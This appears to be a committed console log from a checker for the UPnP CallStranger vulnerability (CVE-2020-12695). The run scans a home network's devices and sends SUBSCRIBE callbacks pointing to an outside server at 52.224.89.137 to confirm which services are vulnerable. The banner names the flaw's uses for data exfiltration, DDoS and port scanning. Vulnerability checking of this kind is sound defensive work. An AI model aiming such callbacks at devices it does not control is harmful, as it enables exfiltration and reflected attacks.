@@ -1,0 +1,211 @@
+_________        .__  .__    _________ __
+\_   ___ \_____  |  | |  |  /   _____//  |_____________    ____    ____   ___________
+/    \  \/\__  \ |  | |  |  \_____  \   __\_  __ \__  \  /    \  / ___\_/ __ \_  __ \
+\     \____/ __ \|  |_|  |__/        \|  |  |  | \// __ \|   |  \/ /_/  >  ___/|  | \/
+ \______  (____  /____/____/_______  /|__|  |__|  (____  /___|  /\___  / \___  >__|
+        \/     \/                  \/                  \/     \//_____/      \/
+This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci) to checkagainst CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:
+* Bypassing DLP for exfiltrating data
+* Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood
+* Scanning internal ports from Internet facing UPnP devices
+You can find detailed information on https://www.callstranger.com
+Stranger Host: http://52.224.89.137
+Stranger Port: 80
+!Error in service definition http://192.168.1.24:2869 urn:dial-multiscreen-org:service:dial:1
+10  devices found:
+
+ Huawei Home Gateway http://192.168.1.1:37215 ( http://192.168.1.1:37215/upnpdev.xml )
+
+  5 service(s) found for Huawei Home Gateway
+     urn:schemas-upnp-org:service:Layer3Forwarding:1    --> http://192.168.1.1:37215/evt/Layer3Forwarding_1
+     urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1    --> http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1
+     urn:schemas-upnp-org:service:WANPPPConnection:1    --> http://192.168.1.1:37215/evt/WANPPPConnection_1
+     urn:schemas-upnp-org:service:WANEthernetLinkConfig:1       --> http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1
+     urn:schemas-upnp-org:service:LANHostConfigManagement:1     --> http://192.168.1.1:37215/evt/LANHostConfigManagement_1
+
+ OturmaTV http://192.168.1.22:2870 ( http://192.168.1.22:2870/dmr.xml )
+
+  3 service(s) found for OturmaTV
+     urn:schemas-upnp-org:service:RenderingControl:3    --> http://192.168.1.22:2870/event/RenderingControl
+     urn:schemas-upnp-org:service:ConnectionManager:3   --> http://192.168.1.22:2870/event/ConnectionManager
+     urn:schemas-upnp-org:service:AVTransport:3         --> http://192.168.1.22:2870/event/AVTransport
+
+ ChromecastOturma4k http://192.168.1.21:8008 ( http://192.168.1.21:8008/ssdp/device-desc.xml )
+
+  1 service(s) found for ChromecastOturma4k
+     urn:dial-multiscreen-org:service:dial:1    --> http://192.168.1.21:8008/ssdp/notfound
+     --skipping  http://192.168.1.21:8008/ssdp/notfound because it contains dummy service keywords
+
+ VESTEL TV http://192.168.1.40:2870 ( http://192.168.1.40:2870/dmr.xml )
+
+  3 service(s) found for VESTEL TV
+     urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.40:2870/RenderingControl/event
+     urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.40:2870/ConnectionManager/event
+     urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.40:2870/AVTransport/event
+
+ MutfakChromecast http://192.168.1.36:8008 ( http://192.168.1.36:8008/ssdp/device-desc.xml )
+
+  1 service(s) found for MutfakChromecast
+     urn:dial-multiscreen-org:service:dial:1    --> http://192.168.1.36:8008/ssdp/notfound
+     --skipping  http://192.168.1.36:8008/ssdp/notfound because it contains dummy service keywords
+
+ VESTEL TV http://192.168.1.40:2870 ( http://192.168.1.40:2870/dmr.xml )
+
+  3 service(s) found for VESTEL TV
+     urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.40:2870/RenderingControl/event
+     urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.40:2870/ConnectionManager/event
+     urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.40:2870/AVTransport/event
+
+ DESKTOP-AEE3E5V http://192.168.1.31:2869 ( http://192.168.1.31:2869/upnphost/udhisapi.dll?content=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695 )
+
+  1 service(s) found for DESKTOP-AEE3E5V
+     urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl
+
+ OturmaTV http://192.168.1.22:49154 ( http://192.168.1.22:49154/nmsDescription-Wifi.xml )
+
+  2 service(s) found for OturmaTV
+     urn:schemas-upnp-org:service:ContentDirectory:3    --> http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO
+     urn:schemas-upnp-org:service:ConnectionManager:2   --> http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO
+
+ XboxOne http://192.168.1.24:2869 ( http://192.168.1.24:2869/upnphost/udhisapi.dll?content=uuid:e69c8b0b-8a9d-4811-839e-c94650077ee0 )
+
+  0 service(s) found for XboxOne
+
+ XboxOne http://192.168.1.24:2869 ( http://192.168.1.24:2869/upnphost/udhisapi.dll?content=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c )
+
+  3 service(s) found for XboxOne
+     urn:schemas-upnp-org:service:RenderingControl:1    --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl
+     urn:schemas-upnp-org:service:AVTransport:1         --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport
+     urn:schemas-upnp-org:service:ConnectionManager:1   --> http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager
+
+ Total 20 service(s) found. do you want to continue to VERIFY if service(s) are vulnerable?
+Be careful: This operation needs Internet access and may transfer data about devices over network. Data encrypted on local and we cant see which services are vulnerable but ISPs and other elements may be able to inspect HTTP headers created by UPnP device. Because most of UPnPstack do not allow SSL conenction we couldnot use it.
+Do you want to continue? y/N y
+Successfully get session:r6orrclhtqfh0a93t3kfojnnei
+Symmetric random key for encryption. b'Go1wFTPGjWjQFL5IqaskAYlVxIKwkoBigh-fH1du5qA='  We do not send this value to server so we can not see which services are vulnerable. All confirmation process is done on client side
+Calling stranger for  http://192.168.1.1:37215/evt/Layer3Forwarding_1 with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWV5XK2XFE44E3YnlJEvwOzmbjweURfXytOY5kixsyDnVv0v9RsKonB2_-4MWbxM_Hy-s0s3q_aF_mVk4LnKePcGo9YTjuqv5ycdO_pPeGAWckuo4rLgf6u-RDpaeE8uP_W&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.1:37215/evt/Layer3Forwarding_1 seems successfull
+{'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:07541427-8712-7236-3255-534778139122', 'Date': 'Mon, 08 Jun 2020 00:25:57 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1 with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWVLshWWvRarU53ZwxoCFOsVKlzvxHYTuvTlFythcrikUmm-I-Bac84Efp4e0XmTnq6AYfNRF6fMfBRTTtB7c7e_AMezF8CxE5pByWIH-pjEY8hdZjkq243hUHnxojrSdBUfE2nooIG7XnGj_5CRcF2mQ==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1 seems successfull
+{'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:75999631-3299-6264-5634-283337000299', 'Date': 'Mon, 08 Jun 2020 00:25:57 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.1:37215/evt/WANPPPConnection_1 with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWVMBZ32seTGnWULJeEAYtkkCLAZgoSnA4mDUQWA3HgtzLVUhte9ldC7L4Irp-bMZ2U-OSxJEPlgBIyG8AFbtDslccGnXLnpXOFnjxk5O8foL0yHFNC9aFyItpGQxyH2dJ1&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.1:37215/evt/WANPPPConnection_1 seems successfull
+{'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:15270507-7650-2562-8900-065631906156', 'Date': 'Mon, 08 Jun 2020 00:25:57 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1 with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWkGOlOYY7DPkD-wMLwlYEEQYiXBqb5Exqf8AYxPa0WwR939J8IRo7mBWhWyvcgJOUd0_Oq4gZe34c7WG4nkeSqyGK0eL5aiTbNloKD2hh9uI2f_1Up1aSyzeXvMqZNci1VUoPG6wJgohm-nmlyQ0Tuw==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1 seems successfull
+{'Server': 'ATP UPnP Core', 'TIMEOUT': 'Second-1800', 'SID': 'uuid:24355442-5570-5931-4343-194825614057', 'Date': 'Mon, 08 Jun 2020 00:25:57 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.1:37215/evt/LANHostConfigManagement_1 with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWj2p8LBMaEP_4DjAsu2kxJ6YFc6TZkwpcmsbeZwu2afDkmGAI25fTNRsM3QkULHjK5OHwGpoLn0b-vk_SPoN8we8y22VIH9d9n_xbz4PDvy-6CWk5g1704fqyZbezDx4dTuIQ7acB4So-VA0tINJyNw==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.1:37215/evt/LANHostConfigManagement_1 failed with status code:501
+{'Server': 'ATP UPnP Core', 'Date': 'Mon, 08 Jun 2020 00:25:57 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.22:2870/event/RenderingControl with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWUzY8zZZNQa9rITEnhjF5odGZvNMjbOnrWDQyw2SqINUhgLPJ9cPWUbAiqVfhKm4WR1GMcSsUACUn4AUODJaQxQogGlnVHBpfFjUxdB6NJQ6iWOaXUgRI_GvaHwrSiNrg&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.22:2870/event/RenderingControl seems successfull
+{'DATE': 'Mon, 08 Jun 2020 00:25:57 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13d360b0-a367-108f-91f2-f1edf2b0e95d', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.22:2870/event/ConnectionManager with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWOQBg1sorO_142fdTj_sFnwj9PP4aApYtN1KsHnoqL0BcGSiltD1lIuAsL1ektaTCHpGgZhQ6c_VopLkjmOJLQKrlUJgXHXY6AdBrxy68rNtD4KZCntg0oCibT34VjTsnumrOWCr8sCkdG4QbnCR6Og==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.22:2870/event/ConnectionManager seems successfull
+{'DATE': 'Mon, 08 Jun 2020 00:25:57 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13d79680-a367-108f-a110-c831563f5ca1', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.22:2870/event/AVTransport with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWG6XmqZ9_JaVW8xPdlnQu9HQpnyYHI2ZbN6Y0c-nwXbkrlA7cSX0U5626d1tlFD7ych9aGIpOifL7_rtlgbboyvIvAO1seF5FuWR8frXo0GFBSHJBkdQ8t0OVvBTN7IWL&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.22:2870/event/AVTransport seems successfull
+{'DATE': 'Mon, 08 Jun 2020 00:25:57 GMT', 'SERVER': 'IPI/1.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13dad8ea-a367-108f-b03b-8c7873ef35d5', 'TIMEOUT': 'Second-300', 'CONTENT-LENGTH': '0', 'CONNECTION': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/RenderingControl/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWi6_kQRD9_BlTw5H_l8rJhxeLAvW7ATHiCA_ujFMqU2-dNvqvvNRUjSiQrg7iBs9ZdSZ7G6_MGiCegednsrliB8x4cDHWZzeEOMepYFwuYtfoHWPDTmxB8rBaiw3yJoMW&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/RenderingControl/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13ee21ca-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/ConnectionManager/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWXR_Gu_ezGeBcP647McEl1x-mNmdVzDcxNxLDxO08n_N4-9pBSV6nmDr_f1neKksBifRWmlN190xcSvn1U0nLBTDDKTQRgcUk1z8lugO219ot8bO0OlJ8JnzWu8SW2tchN5sa4gyZuWPXQqgI0Pp0pA==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/ConnectionManager/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f19422-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/AVTransport/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWPiyMRzJ8aH74NalQzsCy_HKFJYBNMGvM4YXrLJI6KYm5h4C7euiyTOpDTBnEv5PVyT3xmaSDe-rf7MuHF7NODI_BtIuOp2GhYIvqVe5SkG2WOLmuFOJ-idh_iV5Tsgmm&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/AVTransport/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f5d366-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/RenderingControl/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWfuQFrRxSbxmbzqOMmyd2pxXw_hpuUyfkXsc0NiKtwimoySNOYZTYva4QPHEOhX9hO-gOnlAhbUd0KychcNxH4Xh5nVzfviYoE7HevWrxcsBlnXB-QHhll2UOa5eur1JV&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/RenderingControl/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13f9edd4-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/ConnectionManager/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWjdQFgMHTJpFTapC3U9KUoliVYdFTwqUNo8-HEhkYSmly-3N_cjHVCzYzc2IFGnt_M4x3turFl7DjRdmCqzS99esrOwlpZG0EepN1JaS1FEZoeKfkF76Iz87FUv66toiajg2ZTtdK9CdifV-g3O8Mgg==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/ConnectionManager/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:13fde470-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.40:2870/AVTransport/event with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWmCSFApQW0EqwcjkTPG0ITz1iHTeJru5Jf7D0IXKCaCnFBo9ynh5QCDfSGuR7YpXd5OpBbAFqa58-QwNNlZaT0SMTViuiCGqszyjTdRrgiLYiMv8mJAVPBg07CrK3ILKx&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.40:2870/AVTransport/event seems successfull
+{'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Server': 'NFLC/3.0 UPnP/1.0 DLNADOC/1.50', 'SID': 'uuid:14021f2c-a368-108f-8000-980983715753', 'Timeout': 'Second-300', 'Content-Length': '0', 'Connection': 'Keep-Alive'}
+
+Calling stranger for  http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWvDaVq8jWD6aBLJwpfWUZbKyyzJxiYd2BwqkoO8bUTDhTGBWvDC1pSDhqh46rM_Htk0AQ6-N47JEA8ljP-JF073U6TeQZoQsGlyto6Hj0AYVqZlGOpGmnL32pNgsWntKWJnHYjId5rMb2Bhm4EFTEwVen_CLBZLUmnjXJNFSHisu1PMrex1SrYhDbxj84t47QTEhnYct1MkYgs5TcajyWG1w7hhW7s0kjQQKCX7krC9lzP_vPSqQXh_9V9ngRmtgr&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl seems successfull
+{'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:bb7fbaac-4bda-4ca8-aef2-3278083a6c32', 'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWW7Vqa-S6ucZXURWKW9dFu8rRTmbby-0cwPSz86jyknMPS34lhsqg7CrZ9C5ifHghlZMvKOv1OCad1ZS-_UPD5mhfSc8DFn2O6z-05QAViBac417YSyPrXCjiE0uo50gjOBtJoQt2NqgON0emOaEVIzg==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO seems successfull
+{'DATE': 'Mon, 08 Jun 2020 00:25:57 GMT', 'SERVER': 'Linux2.6/0.0 UPnP/1.0 PhilipsIntelSDK/1.4 DLNADOC/1.50', 'SID': 'uuid:C0A80120-0000-0000-B469-000000000043', 'TIMEOUT': 'Second-300', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWul-xu0Qd1axJ_sQlFp5CQbODxEVd-1ZkN73VUlyia5-7cPQZaXc-djWuEDAo2DrSYnMFxkGuQa1OUaEtckJDwRQLrQIY7ea210hZ7ZIktxx7caVR7nabCc1WPFuut19b5x6DslU2x3FOV4fpPtu_Yg==&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO seems successfull
+{'DATE': 'Mon, 08 Jun 2020 00:25:57 GMT', 'SERVER': 'Linux2.6/0.0 UPnP/1.0 PhilipsIntelSDK/1.4 DLNADOC/1.50', 'SID': 'uuid:C0A80120-0000-0000-B469-000000000044', 'TIMEOUT': 'Second-300', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWj0fPN5jBV5Xvu4Df9kpz0wPqHoLXAg6D459cZbfMi3ssKkAGFfX_6DR5G3rKTEu1Ha-71mBT4MOE93tF27hLYnEtaVsLRrMXhS0QcSMVHf4HrrzY4a_BWkRNKXpeBHne0A8i6gpY3z5zMEfzhw0x-QuaRNdVZlmNnxoxtmAynuYUc92OgEP4O6_C3V8quOXKlsmXPNAnCErboC3Pfruz2YIOccKN0eiN3mfUQFzPXTao1uIWMOU3qmk20cIRHGrH&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl seems successfull
+{'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:077b00a1-79a4-4a1d-b9d0-798c1cc56f32', 'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWW0N606l74W9Rc-WiKLavtt1MWlisg3Vxhe0Qz4hs69Azcm0EDPwcoVvQNTJeg2dpz9i5kR3v9VV9afvpjNmA8s0SSqN3Y0oJjMHb09ylXH4eEcPNZvT8-GyZ_TDCp_zjX0JDN51n_zYa6J8WFGNLPZf_6q8pzDJnUSaXVuf0nhfGK3TR2qTQUMbj1oVer3q7IHIzLefzQEvKS9EK0JaWT9u9KhIeDaa7C0xNxweyvB_LmycISxconCeOLvL6D3njU&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport seems successfull
+{'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:431e2067-e641-4cbb-a587-654425869025', 'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Content-Length': '0'}
+
+Calling stranger for  http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager with http://52.224.89.137:80/CallStranger.php?c=addservice&service=gAAAAABe3YWWktGqL5I6ERYBx7j_bL4tt_08w4LL7oRcHkKbphMA-jD931ZynXLNds8NfZArVFiDG2S0V3FTywgSerRjgSn5Gq1ofXTT56LyHqmJvz0h2oqzTE_rpcIC7e8IYa2l4zyIx9rd1GKuOVMrF4ddRNbP1C0MiccNZ69heLYytjQtur2VXNVDKCsItcwJwRF5pACPvm9R8Qitfc485retzbaHLg4DsyUUKr-Av6ETORTr8CFRThbRUy7Ltt4WJXxbpRZb&token=r6orrclhtqfh0a93t3kfojnnei
+Subscribe to http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager seems successfull
+{'Server': 'Microsoft-Windows/10.0 UPnP/1.0 UPnP-Device-Host/1.0 Microsoft-HTTPAPI/2.0', 'Timeout': 'Second-300', 'SID': 'uuid:82b2697c-f6af-4423-b21d-c6ebe09c7576', 'Date': 'Mon, 08 Jun 2020 00:25:58 GMT', 'Content-Length': '0'}
+
+Waiting 5 second for server processing
+Successfully get services from server: http://52.224.89.137:80/CallStranger.php?c=getservices&token=r6orrclhtqfh0a93t3kfojnnei
+
+Encrypted vulnerable services:
+gAAAAABe3YWWUzY8zZZNQa9rITEnhjF5odGZvNMjbOnrWDQyw2SqINUhgLPJ9cPWUbAiqVfhKm4WR1GMcSsUACUn4AUODJaQxQogGlnVHBpfFjUxdB6NJQ6iWOaXUgRI_GvaHwrSiNrg
+gAAAAABe3YWWOQBg1sorO_142fdTj_sFnwj9PP4aApYtN1KsHnoqL0BcGSiltD1lIuAsL1ektaTCHpGgZhQ6c_VopLkjmOJLQKrlUJgXHXY6AdBrxy68rNtD4KZCntg0oCibT34VjTsnumrOWCr8sCkdG4QbnCR6Og==
+gAAAAABe3YWWG6XmqZ9_JaVW8xPdlnQu9HQpnyYHI2ZbN6Y0c-nwXbkrlA7cSX0U5626d1tlFD7ych9aGIpOifL7_rtlgbboyvIvAO1seF5FuWR8frXo0GFBSHJBkdQ8t0OVvBTN7IWL
+gAAAAABe3YWWi6_kQRD9_BlTw5H_l8rJhxeLAvW7ATHiCA_ujFMqU2-dNvqvvNRUjSiQrg7iBs9ZdSZ7G6_MGiCegednsrliB8x4cDHWZzeEOMepYFwuYtfoHWPDTmxB8rBaiw3yJoMW
+gAAAAABe3YWV5XK2XFE44E3YnlJEvwOzmbjweURfXytOY5kixsyDnVv0v9RsKonB2_-4MWbxM_Hy-s0s3q_aF_mVk4LnKePcGo9YTjuqv5ycdO_pPeGAWckuo4rLgf6u-RDpaeE8uP_W
+gAAAAABe3YWWXR_Gu_ezGeBcP647McEl1x-mNmdVzDcxNxLDxO08n_N4-9pBSV6nmDr_f1neKksBifRWmlN190xcSvn1U0nLBTDDKTQRgcUk1z8lugO219ot8bO0OlJ8JnzWu8SW2tchN5sa4gyZuWPXQqgI0Pp0pA==
+gAAAAABe3YWWPiyMRzJ8aH74NalQzsCy_HKFJYBNMGvM4YXrLJI6KYm5h4C7euiyTOpDTBnEv5PVyT3xmaSDe-rf7MuHF7NODI_BtIuOp2GhYIvqVe5SkG2WOLmuFOJ-idh_iV5Tsgmm
+gAAAAABe3YWWfuQFrRxSbxmbzqOMmyd2pxXw_hpuUyfkXsc0NiKtwimoySNOYZTYva4QPHEOhX9hO-gOnlAhbUd0KychcNxH4Xh5nVzfviYoE7HevWrxcsBlnXB-QHhll2UOa5eur1JV
+gAAAAABe3YWWjdQFgMHTJpFTapC3U9KUoliVYdFTwqUNo8-HEhkYSmly-3N_cjHVCzYzc2IFGnt_M4x3turFl7DjRdmCqzS99esrOwlpZG0EepN1JaS1FEZoeKfkF76Iz87FUv66toiajg2ZTtdK9CdifV-g3O8Mgg==
+gAAAAABe3YWWmCSFApQW0EqwcjkTPG0ITz1iHTeJru5Jf7D0IXKCaCnFBo9ynh5QCDfSGuR7YpXd5OpBbAFqa58-QwNNlZaT0SMTViuiCGqszyjTdRrgiLYiMv8mJAVPBg07CrK3ILKx
+gAAAAABe3YWWvDaVq8jWD6aBLJwpfWUZbKyyzJxiYd2BwqkoO8bUTDhTGBWvDC1pSDhqh46rM_Htk0AQ6-N47JEA8ljP-JF073U6TeQZoQsGlyto6Hj0AYVqZlGOpGmnL32pNgsWntKWJnHYjId5rMb2Bhm4EFTEwVen_CLBZLUmnjXJNFSHisu1PMrex1SrYhDbxj84t47QTEhnYct1MkYgs5TcajyWG1w7hhW7s0kjQQKCX7krC9lzP_vPSqQXh_9V9ngRmtgr
+gAAAAABe3YWWj0fPN5jBV5Xvu4Df9kpz0wPqHoLXAg6D459cZbfMi3ssKkAGFfX_6DR5G3rKTEu1Ha-71mBT4MOE93tF27hLYnEtaVsLRrMXhS0QcSMVHf4HrrzY4a_BWkRNKXpeBHne0A8i6gpY3z5zMEfzhw0x-QuaRNdVZlmNnxoxtmAynuYUc92OgEP4O6_C3V8quOXKlsmXPNAnCErboC3Pfruz2YIOccKN0eiN3mfUQFzPXTao1uIWMOU3qmk20cIRHGrH
+gAAAAABe3YWW0N606l74W9Rc-WiKLavtt1MWlisg3Vxhe0Qz4hs69Azcm0EDPwcoVvQNTJeg2dpz9i5kR3v9VV9afvpjNmA8s0SSqN3Y0oJjMHb09ylXH4eEcPNZvT8-GyZ_TDCp_zjX0JDN51n_zYa6J8WFGNLPZf_6q8pzDJnUSaXVuf0nhfGK3TR2qTQUMbj1oVer3q7IHIzLefzQEvKS9EK0JaWT9u9KhIeDaa7C0xNxweyvB_LmycISxconCeOLvL6D3njU
+gAAAAABe3YWWktGqL5I6ERYBx7j_bL4tt_08w4LL7oRcHkKbphMA-jD931ZynXLNds8NfZArVFiDG2S0V3FTywgSerRjgSn5Gq1ofXTT56LyHqmJvz0h2oqzTE_rpcIC7e8IYa2l4zyIx9rd1GKuOVMrF4ddRNbP1C0MiccNZ69heLYytjQtur2VXNVDKCsItcwJwRF5pACPvm9R8Qitfc485retzbaHLg4DsyUUKr-Av6ETORTr8CFRThbRUy7Ltt4WJXxbpRZb
+gAAAAABe3YWVMBZ32seTGnWULJeEAYtkkCLAZgoSnA4mDUQWA3HgtzLVUhte9ldC7L4Irp-bMZ2U-OSxJEPlgBIyG8AFbtDslccGnXLnpXOFnjxk5O8foL0yHFNC9aFyItpGQxyH2dJ1
+
+
+Decyripting vulnerable services with key: b'Go1wFTPGjWjQFL5IqaskAYlVxIKwkoBigh-fH1du5qA='
+
+Verified vulnerable services:
+1:      http://192.168.1.22:2870/event/RenderingControl
+2:      http://192.168.1.22:2870/event/ConnectionManager
